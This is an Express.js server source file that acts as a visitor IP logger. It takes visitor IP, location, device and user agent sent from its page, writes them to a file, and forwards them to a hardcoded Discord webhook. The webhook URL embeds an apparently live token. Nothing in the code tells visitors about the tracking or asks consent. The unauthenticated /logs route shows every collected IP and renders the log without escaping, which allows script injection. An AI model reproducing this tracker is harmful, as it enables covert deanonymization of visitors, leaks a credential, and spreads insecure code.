const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 5000;
const LOG_FILE = 'ip_log.txt';

// GANTI DENGAN WEBHOOK DISCORD LO
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1358800842995531927/7sK8AwlIyy16NliKLzz0i-iZL_evnF2Sr-U2fHFT3sRaIAbv41LrF5MDMxWdL76ZbXOh';

// Middleware
app.use(express.static('static'));
app.use(express.json());

function sendToDiscord(ip, location, device, ua, time) {
  const embed = {
    embeds: [
      {
        title: "🌐 New Visitor Detected!",
        color: 3447003, // Biru
        fields: [
          { name: "🕒 Time", value: time, inline: false },
          { name: "📍 IP", value: ip, inline: true },
          { name: "🌍 Location", value: location, inline: true },
          { name: "💻 Device", value: device, inline: true },
          { name: "🕵️ User Agent", value: ua.slice(0, 1024), inline: false }
        ],
        footer: {
          text: "Visitor Logger by Express.js"
        }
      }
    ]
  };

  axios.post(DISCORD_WEBHOOK, embed)
    .then(() => console.log("✅ Sent to Discord"))
    .catch(err => console.error("❌ Discord Error:", err.message));
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'static', 'index.html'));
});

app.post('/log', (req, res) => {
  const { ip = "N/A", location = "N/A", device = "N/A", userAgent = "N/A" } = req.body;
  const time = new Date().toLocaleString();

  const logLine = `[${time}] IP: ${ip} | Loc: ${location} | Device: ${device}\n`;

  fs.appendFileSync(LOG_FILE, logLine);

  sendToDiscord(ip, location, device, userAgent, time);

  res.json({ status: "ok" });
});

app.get('/logs', (req, res) => {
  if (!fs.existsSync(LOG_FILE)) {
    return res.send("No logs yet.");
  }
  const logs = fs.readFileSync(LOG_FILE, 'utf8');
  res.send(`<pre>${logs}</pre>`);
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
